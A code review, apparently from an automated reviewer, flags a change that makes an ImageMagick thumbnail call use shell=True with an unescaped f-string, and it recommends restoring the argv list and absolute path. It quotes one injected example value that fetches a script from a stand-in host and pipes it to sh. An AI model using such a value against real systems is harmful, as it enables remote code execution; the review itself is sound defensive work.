findings.body:
`subprocess.run(..., shell=True)` with an unescaped f-string lets `upload_dir`, `name`, and `oid` be interpreted by the shell. A value such as `name="x; curl evil.test/exfil | sh"` (or metacharacters in `upload_dir` / `oid`) runs arbitrary commands as the service user.

The prior argv-list form was injection-safe: those strings were one argument each to `/usr/bin/convert`. ImageMagick 7 policy/delegates do not require shell form — keep the list argv (and absolute binary path), or if you must build a shell command, pass a fixed argv to `convert` only and never interpolate untrusted segments into `shell=True`.

```suggestion
    subprocess.run(
        ["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
        check=True,
    )
```

The command string calls bare `convert` instead of the previous `/usr/bin/convert`. On a runner or host where PATH can be influenced, a different binary may be executed. Prefer the absolute path (or an explicit env) even if you keep a non-shell invoke.

summary:
## Verdict

This change introduces a **critical command-injection** vulnerability by switching `subprocess.run` from an argv list to `shell=True` with an unescaped f-string.

## Analysis

`make_thumb` interpolates `upload_dir`, `name`, and `oid` directly into a shell command. Any metacharacter in those values (`;`, `|`, `$(...)`, backticks, spaces, etc.) is interpreted by the shell. The previous argv-list form passed those strings as a single argument to `/usr/bin/convert` and did not invoke a shell, so the same inputs could not run arbitrary commands.

The new comment claims shell form is required for an ImageMagick 7 policy delegate. ImageMagick policy and delegate handling apply to the `convert` binary itself and do not require `shell=True`. If PATH or policy discovery is the real issue, keep the argv list and point at the correct binary (for example `/usr/bin/convert` or MagickWand), or set env explicitly — do not hand user-controlled path fragments to a shell.

Dropping the absolute path `/usr/bin/convert` for bare `convert` also makes the call PATH-dependent on the runner.

**Recommendation:** request-changes
